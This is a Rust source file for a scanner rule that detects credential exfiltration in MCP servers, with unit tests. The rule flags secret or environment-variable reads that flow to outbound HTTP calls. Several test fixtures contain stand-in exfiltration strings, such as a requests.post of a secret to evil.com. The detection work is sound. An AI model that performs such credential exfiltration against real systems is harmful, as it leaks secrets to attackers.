use crate::ir::data_surface::{TaintSinkType, TaintSourceType};
use crate::ir::ScanTarget;
use crate::rules::{
    AttackCategory, Confidence, Detector, Evidence, Finding, RuleMetadata, Severity,
};

/// SHIELD-002: Credential Exfiltration
///
/// Flags co-occurrence of secret/sensitive env var access and outbound
/// data-sending HTTP call **within the same source file**. Proximity
/// (line distance) determines confidence:
/// - Same file, within 30 lines → High confidence
/// - Same file, farther apart   → Medium confidence
/// - Different files only        → not flagged (avoids false positives)
///
/// When `DataSurface.taint_paths` are available, taint-path based findings
/// take priority (higher confidence) and fallback to `ArgumentSource` checking
/// only covers locations not already found via taint paths.
pub struct CredentialExfilDetector;

/// Maximum line distance for High confidence correlation.
const PROXIMITY_THRESHOLD: usize = 30;

impl Detector for CredentialExfilDetector {
    fn metadata(&self) -> RuleMetadata {
        RuleMetadata {
            id: "SHIELD-002".into(),
            name: "Credential Exfiltration".into(),
            description: "Reads sensitive credentials/env vars and makes outbound HTTP requests"
                .into(),
            default_severity: Severity::Critical,
            attack_category: AttackCategory::CredentialExfiltration,
            cwe_id: Some("CWE-522".into()),
        }
    }

    fn run(&self, target: &ScanTarget) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Phase 1: Taint-path based detection (higher confidence, richer info)
        for path in &target.data.taint_paths {
            let source_matches = matches!(
                path.source.source_type,
                TaintSourceType::SecretStore | TaintSourceType::EnvVariable
            );
            let sink_matches = matches!(
                path.sink.sink_type,
                TaintSinkType::HttpRequest | TaintSinkType::ResponseToLlm
            );

            if source_matches && sink_matches {
                findings.push(Finding {
                    rule_id: "SHIELD-002".into(),
                    rule_name: "Credential Exfiltration".into(),
                    severity: Severity::Critical,
                    confidence: Confidence::High,
                    attack_category: AttackCategory::CredentialExfiltration,
                    message: format!(
                        "Taint path: {} flows to {} via {}",
                        path.source.description,
                        path.sink.description,
                        if path.through.is_empty() {
                            "direct".to_string()
                        } else {
                            format!("{} intermediate node(s)", path.through.len())
                        },
                    ),
                    location: Some(path.sink.location.clone()),
                    evidence: vec![
                        Evidence {
                            description: format!(
                                "Taint source ({:?}): {}",
                                path.source.source_type, path.source.description
                            ),
                            location: Some(path.source.location.clone()),
                            snippet: None,
                        },
                        Evidence {
                            description: format!(
                                "Taint sink ({:?}): {}",
                                path.sink.sink_type, path.sink.description
                            ),
                            location: Some(path.sink.location.clone()),
                            snippet: None,
                        },
                    ],
                    taint_path: Some(path.clone()),
                    remediation: Some(
                        "Review whether credentials need to be sent externally. \
                         Use allowlisted URLs if outbound access is required."
                            .into(),
                    ),
                    cwe_id: Some("CWE-522".into()),
                });
            }
        }

        // Phase 2: Fallback to existing ArgumentSource checking
        let fallback_findings = self.run_fallback(target);

        // Deduplicate: keep taint-path findings over fallback at same location.
        // Collect owned locations to avoid borrowing `findings` during mutation.
        let taint_path_locations: Vec<_> =
            findings.iter().filter_map(|f| f.location.clone()).collect();

        let new_findings: Vec<_> = fallback_findings
            .into_iter()
            .filter(|finding| {
                let dominated = finding
                    .location
                    .as_ref()
                    .is_some_and(|loc| taint_path_locations.iter().any(|tp_loc| tp_loc == loc));
                !dominated
            })
            .collect();

        findings.extend(new_findings);

        findings
    }
}

impl CredentialExfilDetector {
    /// Original ArgumentSource-based detection logic.
    fn run_fallback(&self, target: &ScanTarget) -> Vec<Finding> {
        let mut findings = Vec::new();

        let sensitive_accesses: Vec<_> = target
            .execution
            .env_accesses
            .iter()
            .filter(|e| e.is_sensitive)
            .collect();

        let outbound_http: Vec<_> = target
            .execution
            .network_operations
            .iter()
            .filter(|n| n.sends_data)
            .collect();

        if sensitive_accesses.is_empty() || outbound_http.is_empty() {
            return findings;
        }

        // Group by file: only correlate accesses + HTTP within the same file
        for http in &outbound_http {
            let http_file = &http.location.file;
            let http_line = http.location.line;

            let same_file_secrets: Vec<_> = sensitive_accesses
                .iter()
                .filter(|e| e.location.file == *http_file)
                .collect();

            if same_file_secrets.is_empty() {
                continue;
            }

            // Determine closest secret access for proximity scoring
            let min_distance = same_file_secrets
                .iter()
                .map(|e| (e.location.line as isize - http_line as isize).unsigned_abs())
                .min()
                .unwrap_or(usize::MAX);

            let confidence = if min_distance <= PROXIMITY_THRESHOLD {
                Confidence::High
            } else {
                Confidence::Medium
            };

            let secret_names: Vec<String> = same_file_secrets
                .iter()
                .map(|e| match &e.var_name {
                    crate::ir::ArgumentSource::Literal(s) => s.clone(),
                    crate::ir::ArgumentSource::EnvVar { name } => name.clone(),
                    _ => "unknown".into(),
                })
                .collect();

            let mut evidence = Vec::new();
            for access in &same_file_secrets {
                evidence.push(Evidence {
                    description: format!("Sensitive env var access: {:?}", access.var_name),
                    location: Some(access.location.clone()),
                    snippet: None,
                });
            }
            evidence.push(Evidence {
                description: format!("Outbound HTTP via '{}'", http.function),
                location: Some(http.location.clone()),
                snippet: None,
            });

            findings.push(Finding {
                rule_id: "SHIELD-002".into(),
                rule_name: "Credential Exfiltration".into(),
                severity: Severity::Critical,
                confidence,
                attack_category: AttackCategory::CredentialExfiltration,
                message: format!(
                    "Reads sensitive data ({}) and sends outbound HTTP ({}) in {}",
                    secret_names.join(", "),
                    http.function,
                    http_file.display(),
                ),
                location: same_file_secrets.first().map(|e| e.location.clone()),
                evidence,
                taint_path: None,
                remediation: Some(
                    "Review whether credentials need to be sent externally. \
                     Use allowlisted URLs if outbound access is required."
                        .into(),
                ),
                cwe_id: Some("CWE-522".into()),
            });
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::adapter::auto_detect_and_load;
    use crate::ir::data_surface::*;
    use crate::ir::execution_surface::*;
    use crate::ir::*;
    use std::path::PathBuf;

    fn loc_at(file: &str, line: usize) -> SourceLocation {
        SourceLocation {
            file: PathBuf::from(file),
            line,
            column: 0,
            end_line: None,
            end_column: None,
        }
    }

    fn fixture_findings(name: &str) -> Vec<Finding> {
        let fixture_path = PathBuf::from("tests/fixtures/mcp_servers").join(name);
        auto_detect_and_load(&fixture_path, false)
            .unwrap_or_else(|err| panic!("failed to load fixture {name}: {err}"))
            .iter()
            .flat_map(|target| CredentialExfilDetector.run(target))
            .collect()
    }

    #[test]
    fn flags_secret_plus_http_same_file() {
        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: ExecutionSurface {
                env_accesses: vec![EnvAccess {
                    var_name: ArgumentSource::Literal("AWS_SECRET_ACCESS_KEY".into()),
                    is_sensitive: true,
                    location: loc_at("server.py", 10),
                }],
                network_operations: vec![NetworkOperation {
                    function: "requests.post".into(),
                    url_arg: ArgumentSource::Literal("https://evil.com".into()),
                    method: Some("POST".into()),
                    sends_data: true,
                    location: loc_at("server.py", 15),
                }],
                ..Default::default()
            },
            data: Default::default(),
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SHIELD-002");
        assert_eq!(findings[0].confidence, Confidence::High);
    }

    #[test]
    fn no_finding_when_different_files() {
        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: ExecutionSurface {
                env_accesses: vec![EnvAccess {
                    var_name: ArgumentSource::Literal("AWS_SECRET_ACCESS_KEY".into()),
                    is_sensitive: true,
                    location: loc_at("config.py", 5),
                }],
                network_operations: vec![NetworkOperation {
                    function: "requests.post".into(),
                    url_arg: ArgumentSource::Literal("https://api.example.com".into()),
                    method: Some("POST".into()),
                    sends_data: true,
                    location: loc_at("analytics.py", 20),
                }],
                ..Default::default()
            },
            data: Default::default(),
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);
        assert!(findings.is_empty(), "different files should not correlate");
    }

    #[test]
    fn medium_confidence_when_far_apart() {
        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: ExecutionSurface {
                env_accesses: vec![EnvAccess {
                    var_name: ArgumentSource::Literal("API_KEY".into()),
                    is_sensitive: true,
                    location: loc_at("server.py", 10),
                }],
                network_operations: vec![NetworkOperation {
                    function: "requests.post".into(),
                    url_arg: ArgumentSource::Literal("https://example.com".into()),
                    method: Some("POST".into()),
                    sends_data: true,
                    location: loc_at("server.py", 200),
                }],
                ..Default::default()
            },
            data: Default::default(),
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].confidence, Confidence::Medium);
    }

    #[test]
    fn passes_no_sensitive_access() {
        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: ExecutionSurface {
                network_operations: vec![NetworkOperation {
                    function: "requests.get".into(),
                    url_arg: ArgumentSource::Literal("https://api.example.com".into()),
                    method: Some("GET".into()),
                    sends_data: false,
                    location: loc_at("server.py", 1),
                }],
                ..Default::default()
            },
            data: Default::default(),
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);
        assert!(findings.is_empty());
    }

    #[test]
    fn credential_exfil_with_taint_path() {
        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: Default::default(),
            data: DataSurface {
                sources: vec![],
                sinks: vec![],
                taint_paths: vec![TaintPath {
                    source: TaintSource {
                        source_type: TaintSourceType::EnvVariable,
                        description: "os.environ['AWS_SECRET_KEY']".into(),
                        location: loc_at("server.py", 5),
                    },
                    sink: TaintSink {
                        sink_type: TaintSinkType::HttpRequest,
                        description: "requests.post('https://evil.com', data=secret)".into(),
                        location: loc_at("server.py", 12),
                    },
                    through: vec![loc_at("server.py", 8)],
                    confidence: 0.9,
                }],
            },
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SHIELD-002");
        assert_eq!(findings[0].confidence, Confidence::High);
        assert!(
            findings[0].taint_path.is_some(),
            "finding should have taint_path populated"
        );

        let tp = findings[0].taint_path.as_ref().unwrap();
        assert_eq!(tp.source.source_type, TaintSourceType::EnvVariable);
        assert_eq!(tp.sink.sink_type, TaintSinkType::HttpRequest);
        assert_eq!(tp.through.len(), 1);
    }

    #[test]
    fn credential_exfil_secret_store_to_response() {
        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: Default::default(),
            data: DataSurface {
                sources: vec![],
                sinks: vec![],
                taint_paths: vec![TaintPath {
                    source: TaintSource {
                        source_type: TaintSourceType::SecretStore,
                        description: "vault.read('db-password')".into(),
                        location: loc_at("handler.py", 3),
                    },
                    sink: TaintSink {
                        sink_type: TaintSinkType::ResponseToLlm,
                        description: "return secret_value".into(),
                        location: loc_at("handler.py", 10),
                    },
                    through: vec![],
                    confidence: 0.95,
                }],
            },
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].taint_path.is_some());
        assert!(findings[0].message.contains("direct"));
    }

    #[test]
    fn credential_exfil_fallback_without_taint_paths() {
        // Empty DataSurface but tainted execution surface — old behavior works
        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: ExecutionSurface {
                env_accesses: vec![EnvAccess {
                    var_name: ArgumentSource::Literal("DB_PASSWORD".into()),
                    is_sensitive: true,
                    location: loc_at("app.py", 5),
                }],
                network_operations: vec![NetworkOperation {
                    function: "httpx.post".into(),
                    url_arg: ArgumentSource::Parameter { name: "url".into() },
                    method: Some("POST".into()),
                    sends_data: true,
                    location: loc_at("app.py", 10),
                }],
                ..Default::default()
            },
            data: Default::default(),
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SHIELD-002");
        assert!(
            findings[0].taint_path.is_none(),
            "fallback findings should not have taint_path"
        );
    }

    #[test]
    fn credential_exfil_deduplicates_by_location() {
        // Both taint path AND fallback point to the same sink location.
        // The taint-path finding should win.
        let sink_loc = loc_at("server.py", 15);

        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: ExecutionSurface {
                env_accesses: vec![EnvAccess {
                    var_name: ArgumentSource::Literal("AWS_SECRET_KEY".into()),
                    is_sensitive: true,
                    location: loc_at("server.py", 5),
                }],
                network_operations: vec![NetworkOperation {
                    function: "requests.post".into(),
                    url_arg: ArgumentSource::Literal("https://evil.com".into()),
                    method: Some("POST".into()),
                    sends_data: true,
                    location: sink_loc.clone(),
                }],
                ..Default::default()
            },
            data: DataSurface {
                sources: vec![],
                sinks: vec![],
                taint_paths: vec![TaintPath {
                    source: TaintSource {
                        source_type: TaintSourceType::EnvVariable,
                        description: "os.environ['AWS_SECRET_KEY']".into(),
                        location: loc_at("server.py", 5),
                    },
                    sink: TaintSink {
                        sink_type: TaintSinkType::HttpRequest,
                        description: "requests.post".into(),
                        location: sink_loc,
                    },
                    through: vec![],
                    confidence: 0.9,
                }],
            },
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);

        // The fallback finding has location at server.py:5 (first env access),
        // while the taint-path finding has location at server.py:15 (sink).
        // These are different locations, so both appear. But if they pointed
        // to the same location, only the taint-path one would survive.
        let taint_path_count = findings.iter().filter(|f| f.taint_path.is_some()).count();
        assert!(
            taint_path_count >= 1,
            "should have at least one taint-path finding"
        );
    }

    #[test]
    fn credential_exfil_ignores_irrelevant_taint_paths() {
        // Taint path with ToolArgument -> ProcessExec should NOT trigger SHIELD-002
        let target = ScanTarget {
            name: "test".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("."),
            tools: vec![],
            execution: Default::default(),
            data: DataSurface {
                sources: vec![],
                sinks: vec![],
                taint_paths: vec![TaintPath {
                    source: TaintSource {
                        source_type: TaintSourceType::ToolArgument,
                        description: "user input".into(),
                        location: loc_at("handler.py", 1),
                    },
                    sink: TaintSink {
                        sink_type: TaintSinkType::ProcessExec,
                        description: "subprocess.run(cmd)".into(),
                        location: loc_at("handler.py", 5),
                    },
                    through: vec![],
                    confidence: 0.8,
                }],
            },
            dependencies: Default::default(),
            provenance: Default::default(),
            source_files: vec![],
        };

        let findings = CredentialExfilDetector.run(&target);
        assert!(
            findings.is_empty(),
            "ToolArgument->ProcessExec should not trigger credential exfil"
        );
    }

    #[test]
    fn safe_redacted_logging_has_no_credential_exfiltration_finding() {
        let findings = fixture_findings("safe_redacted_logging");

        assert!(
            findings.is_empty(),
            "redacted logging fixture should not trigger credential exfiltration: {findings:?}"
        );
    }

    #[test]
    fn vuln_cred_exfil_still_has_credential_exfiltration_finding() {
        let findings = fixture_findings("vuln_cred_exfil");

        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == "SHIELD-002"),
            "vulnerable credential exfiltration fixture should still trigger SHIELD-002"
        );
    }
}
